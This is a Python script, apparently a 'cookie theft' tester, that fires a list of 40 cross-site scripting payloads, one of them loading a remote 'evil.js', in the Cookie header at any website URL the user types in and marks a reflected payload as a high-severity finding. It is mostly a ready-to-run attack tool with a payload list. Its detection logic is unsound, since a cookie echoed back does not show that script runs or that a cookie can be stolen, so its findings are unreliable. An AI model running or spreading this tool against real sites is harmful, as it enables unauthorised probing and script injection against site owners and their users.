import requests
from colorama import Fore, init

# Initialize colorama for colored output
init(autoreset=True)

# Define payloads
CT1 = "<script>alert('XSS')</script>"
CT2 = "<img src='x' onerror='alert(1)'>"
CT3 = "<body onload='alert(1)'>"
CT4 = "';alert(String.fromCharCode(88,83,83))//"
CT5 = "<iframe src='javascript:alert(1)'></iframe>"
CT6 = "<input type='text' value='<script>alert(1)'></script>'>"
CT7 = "<div onclick='alert(1)'>Click me</div>"
CT8 = "<a href='javascript:alert(1)'>Click</a>"
CT9 = "<embed src='data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>'>"
CT10 = "<link rel='stylesheet' href='javascript:alert(1)'>"
CT11 = "<form action='javascript:alert(1)'><input type='submit'></form>"
CT12 = "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"
CT13 = "<object data='javascript:alert(1)'></object>"
CT14 = "<style>@import 'javascript:alert(1)';</style>"
CT15 = "<svg onload='alert(1)'></svg>"
CT16 = "<marquee onstart='alert(1)'></marquee>"
CT17 = "<table background='javascript:alert(1)'>"
CT18 = "<details ontoggle='alert(1)'></details>"
CT19 = "<audio src='javascript:alert(1)'></audio>"
CT20 = "<video src='javascript:alert(1)'></video>"
CT21 = "<bgsound src='javascript:alert(1)'>"
CT22 = "<isindex action='javascript:alert(1)'>"
CT23 = "<plaintext><script>alert(1)</script>"
CT24 = "<xss onmouseover='alert(1)'>"
CT25 = "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>"
CT26 = "<listing><img src='x' onerror='alert(1)'></listing>"
CT27 = "<noscript><p title='</noscript><svg onload=alert(1)//'>"
CT28 = "<script src='http://example.com/evil.js'></script>"
CT29 = "<svg><script>var a=`<img src=x onerror=alert(1)>`;</script></svg>"
CT30 = "<div style='width:expression(alert(1))'>"
CT31 = "<!--[if gte IE 4]><script>alert(1)</script><![endif]-->"
CT32 = "<html xmlns:xss='http://www.w3.org/1999/xhtml' xss='http://www.w3.org/1999/xhtml'><xss:xss xmlns='http://www.w3.org/1999/xhtml' xss='http://www.w3.org/1999/xhtml'></xss:xss></html>"
CT33 = "<form><button formaction='javascript:alert(1)'>Click</button></form>"
CT34 = "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>"
CT35 = "<button onclick='alert(1)'>Click me</button>"
CT36 = "<applet code='javascript:alert(1)'></applet>"
CT37 = "<object type='text/html' data='javascript:alert(1)'></object>"
CT38 = "<textarea onfocus='alert(1)'></textarea>"
CT39 = "<progress value=100 max=100 onmouseover='alert(1)'></progress>"
CT40 = "<keygen autofocus onfocus='alert(1)'>"

payloads = [CT1, CT2, CT3, CT4, CT5, CT6, CT7, CT8, CT9, CT10,
            CT11, CT12, CT13, CT14, CT15, CT16, CT17, CT18, CT19, CT20,
            CT21, CT22, CT23, CT24, CT25, CT26, CT27, CT28, CT29, CT30,
            CT31, CT32, CT33, CT34, CT35, CT36, CT37, CT38, CT39, CT40]

vulnerabilities = {}

# Function to test cookie theft vulnerability for a given URL
def test_cookie_theft_vulnerability(url):
    try:
        for i, payload in enumerate(payloads):
            # Set headers to mimic a browser request
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                'Cookie': f'session_id={payload}'
            }

            # Send a GET request to the target website with custom headers
            response = requests.get(url, headers=headers, allow_redirects=True)

            # Check if the request was successful (status code 200)
            if response.status_code == 200:
                # Check if the server returned any cookies
                if response.cookies:
                    for cookie in response.cookies:
                        if payload in cookie.value:
                            payload_name = f"CT{i+1}"
                            print(Fore.GREEN + f"Successfully injected payload: {payload_name} - {payload}")
                            vulnerabilities[payload_name] = {"payload": payload, "metric": "high"}
                            return payload_name, payload, "high"
            else:
                print(Fore.RED + f"Failed to access the website with payload CT{i+1}: Status Code: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"An error occurred: {str(e)}")

    return None, None, None

# Main function to execute the program
def run_cookie_theft_test():
    print("[*] Welcome to Cookie Theft Vulnerability Tester")
    target_url = input("[*] Enter your target website URL: ")

    if target_url:
        successful_payload, payload, metric = test_cookie_theft_vulnerability(target_url)
        if successful_payload:
            print(Fore.YELLOW + f"Successfully injected payload: {successful_payload}")
            print(Fore.YELLOW + f"Payload: {payload}")
            print(Fore.YELLOW + f"Vulnerability Metric: {metric}")
        else:
            print(Fore.RED + "No payloads were successfully injected.")

# Execute the main function
if __name__ == "__main__":
    run_cookie_theft_test()
